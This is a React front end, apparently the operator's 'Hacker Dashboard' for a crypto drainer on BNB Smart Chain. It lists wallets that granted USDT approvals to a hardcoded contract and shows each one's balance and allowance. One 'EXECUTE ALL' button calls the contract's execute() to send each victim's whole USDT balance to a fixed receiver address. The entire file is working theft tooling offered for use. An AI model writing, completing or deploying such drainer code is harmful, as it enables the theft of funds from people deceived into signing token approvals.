import { useEffect, useState } from "react";
import { ethers } from "ethers";

export default function Dashboard() {
  const [wallet, setWallet] = useState(null);
  const [users, setUsers] = useState([]);
  const [data, setData] = useState({});

  const OWNER = "0x8Deca032aB074A7CF8DBb7c2425566D76F23078c";
  const CONTRACT = "0x5Eec04E6d2539Df5D3a3873f441c991ea56264BB";
  const USDT = "0x55d398326f99059fF775485246999027B3197955";

  // 🔒 WALLET FISSO (STATICO)
  const RECEIVER = "0x8Deca032aB074A7CF8DBb7c2425566D76F23078c";

  useEffect(() => {
    const init = async () => {
      if (!window.ethereum) return;

      await switchToBSC();

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      setWallet(address);

      await loadUsers(provider);
    };

    init();
  }, []);

  const switchToBSC = async () => {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }],
      });
    } catch {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: "0x38",
          chainName: "BNB Smart Chain",
          rpcUrls: ["https://bsc-dataseed.binance.org/"],
          nativeCurrency: {
            name: "BNB",
            symbol: "BNB",
            decimals: 18
          },
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
    }
  };

  const loadUsers = async (provider) => {
    const contract = new ethers.Contract(
      USDT,
      [
        "event Approval(address indexed owner, address indexed spender, uint256 value)",
        "function allowance(address owner, address spender) view returns (uint256)",
        "function balanceOf(address owner) view returns (uint256)"
      ],
      provider
    );

    const filter = contract.filters.Approval(null, CONTRACT);
    const events = await contract.queryFilter(filter, -20000);

    const unique = [...new Set(events.map(e => e.args.owner))];
    setUsers(unique);

    let newData = {};

    for (let u of unique) {
      try {
        const allowance = await contract.allowance(u, CONTRACT);
        const balance = await contract.balanceOf(u);

        newData[u] = {
          allowance,
          balance
        };
      } catch {}
    }

    setData(newData);
  };

  const executeUser = async (user) => {
    try {
      await switchToBSC();

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const contract = new ethers.Contract(
        CONTRACT,
        [
          "function execute(address token, address from, address to, uint amount) public"
        ],
        signer
      );

      const amount = data[user].balance;

      const tx = await contract.execute(
        USDT,
        user,
        RECEIVER, // 🔒 SEMPRE QUESTO
        amount
      );

      await tx.wait();

      alert("Execute fatto per: " + user);
    } catch (err) {
      console.log(err);
      alert(err.message);
    }
  };

  if (!wallet) return <div style={{ color: "white" }}>Loading...</div>;

  if (wallet.toLowerCase() !== OWNER.toLowerCase()) {
    return <div style={{ color: "red" }}>Access denied</div>;
  }

  return (
    <div style={{
      background: "#000",
      color: "#00ff9f",
      minHeight: "100vh",
      padding: "20px",
      fontFamily: "monospace"
    }}>
      <h2>💻 Hacker Dashboard</h2>

      <p>👤 Logged: {wallet}</p>
      <p>🎯 Receiver: {RECEIVER}</p>

      {users.map((u, i) => (
        <div key={i} style={{
          border: "1px solid #00ff9f",
          padding: "10px",
          marginTop: "10px"
        }}>
          <p>👤 {u}</p>

          <p>
            💰 Balance: {
              data[u]
                ? ethers.formatUnits(data[u].balance, 6)
                : "..."
            }
          </p>

          <p>
            🔓 Allowance: {
              data[u]
                ? (data[u].allowance > 1000000000000000000000000n
                    ? "UNLIMITED"
                    : ethers.formatUnits(data[u].allowance, 6))
                : "..."
            }
          </p>

          <button
            onClick={() => executeUser(u)}
            style={{
              background: "#00ff9f",
              color: "black",
              padding: "10px",
              border: "none",
              cursor: "pointer",
              width: "100%"
            }}
          >
            EXECUTE ALL
          </button>
        </div>
      ))}
    </div>
  );
}